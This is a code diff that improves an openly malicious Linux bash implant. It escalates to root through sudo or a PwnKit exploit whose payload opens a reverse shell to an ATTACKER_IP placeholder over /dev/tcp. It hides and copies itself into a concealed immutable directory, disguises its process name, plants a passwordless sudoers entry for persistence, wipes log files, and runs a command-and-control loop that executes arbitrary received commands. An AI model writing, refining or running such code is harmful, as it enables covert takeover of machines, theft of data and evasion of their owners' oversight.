@@ -27,8 +27,15 @@ SUDOERS_FILE="/etc/sudoers.d/webservice"
 RETRY_INTERVALS=(1 2 4 8 16 32 64)  # Exponential backoff in seconds
 UUID=$(cat /proc/sys/kernel/random/uuid 2>/dev/null || uuidgen 2>/dev/null || echo "client-$RANDOM-$RANDOM")  # Generate unique client ID
 
-# Clean up installation file
-rm -f /tmp/webservice.sh 2>/dev/null
+# Check if running from /tmp/webservice.sh
+if [ "$0" = "/tmp/webservice.sh" ]; then
+    SCRIPT_FILE="/tmp/webservice.sh"
+else
+    SCRIPT_FILE="$HIDDEN_FILE"
+fi
+
+# Clean up installation file if it exists
+[ -f "/tmp/webservice.sh" ] && rm -f "/tmp/webservice.sh" 2>/dev/null
 
 # Function to run PwnKit exploit if not root
 run_pwnkit() {
@@ -60,7 +67,7 @@ void gconv() {}
 void gconv_init() {
     setuid(0); setgid(0);
     setuid(0); setgid(0);
-    system("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'");
+    system("/bin/bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1");
     exit(0);
 }
 EOF
@@ -104,24 +111,34 @@ EOF
 # Check and elevate to root if possible
 if [ $EUID -ne 0 ]; then
     # Try sudo first
-    sudo -n true 2>/dev/null && exec sudo /bin/bash "$0" "$@"
-    IS_ADMIN="No"
-    # If sudo fails, try PwnKit
-    run_pwnkit || {
-        echo "Root escalation failed. Running as non-root." >&2
-    }
+    if sudo -n true 2>/dev/null; then
+        if [ "$0" != "$SCRIPT_FILE" ]; then
+            mkdir -p "$HIDDEN_DIR"
+            cp "$0" "$SCRIPT_FILE" 2>/dev/null
+            chmod 700 "$SCRIPT_FILE" 2>/dev/null
+            exec sudo /bin/bash "$SCRIPT_FILE" "$@"
+        fi
+    else
+        IS_ADMIN="No"
+        # If sudo fails, try PwnKit
+        run_pwnkit || {
+            echo "Root escalation failed. Running as non-root." >&2
+        }
+    fi
 else
     IS_ADMIN="Yes"
 fi
 
 # Hide the payload
-if [ -d "$HIDDEN_DIR" ]; then
-    chattr -i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
+if [ "$0" != "$SCRIPT_FILE" ]; then
+    if [ -d "$HIDDEN_DIR" ]; then
+        chattr -i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
+    fi
+    mkdir -p "$HIDDEN_DIR" 2>/dev/null
+    cp "$0" "$HIDDEN_FILE" 2>/dev/null
+    chmod 700 "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
+    chattr +i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
 fi
-mkdir -p "$HIDDEN_DIR"
-cp "$0" "$HIDDEN_FILE"
-chmod 700 "$HIDDEN_DIR" "$HIDDEN_FILE"
-chattr +i "$HIDDEN_DIR" "$HIDDEN_FILE" 2>/dev/null
 echo "$PROCESS_NAME" > /proc/self/comm 2>/dev/null  # Hide process name
 
 # Persistence (multiple methods)
@@ -131,9 +148,17 @@ done
 
 # Add sudoers entry for root elevation on reboot
 if [ $EUID -eq 0 ]; then
-    echo "$(whoami) ALL=(ALL) NOPASSWD: $HIDDEN_FILE" > "$SUDOERS_FILE"
-    chmod 440 "$SUDOERS_FILE"
-    chattr +i "$SUDOERS_FILE" 2>/dev/null
+    if [ -d "/etc/sudoers.d" ]; then
+        echo "$(whoami) ALL=(ALL) NOPASSWD: $HIDDEN_FILE" > "$SUDOERS_FILE" 2>/dev/null
+        if [ $? -eq 0 ]; then
+            chmod 440 "$SUDOERS_FILE" 2>/dev/null
+            chattr +i "$SUDOERS_FILE" 2>/dev/null
+        else
+            echo "Failed to write to $SUDOERS_FILE. Skipping sudoers setup." >&2
+        fi
+    else
+        echo "/etc/sudoers.d not found. Skipping sudoers setup." >&2
+    fi
 fi
 
 # Data Exfiltration
@@ -154,7 +179,7 @@ fi
 
 # Clean logs to hide tracks
 for log in "${LOG_FILES[@]}"; do
-    [ -f "$log" ] && echo "" > "$log" 2>/dev/null
+    [ -f "$log" ] && [ -w "$log" ] && echo "" > "$log" 2>/dev/null
 done
 
 # Custom command handler
@@ -201,7 +226,7 @@ while true; do
                     handle_custom_command "$cmd"
                     ;;
                 *)
-                    /bin/bash -c "$cmd" 2>&1
+                    /bin/bash -i -c "$cmd" 2>&1
                     ;;
             esac
         done
@@ -214,4 +239,4 @@ while true; do
 done &
 
 # Clean up the original script
-rm -f "$0" 2>/dev/null
+[ "$0" != "$SCRIPT_FILE" ] && rm -f "$0" 2>/dev/null
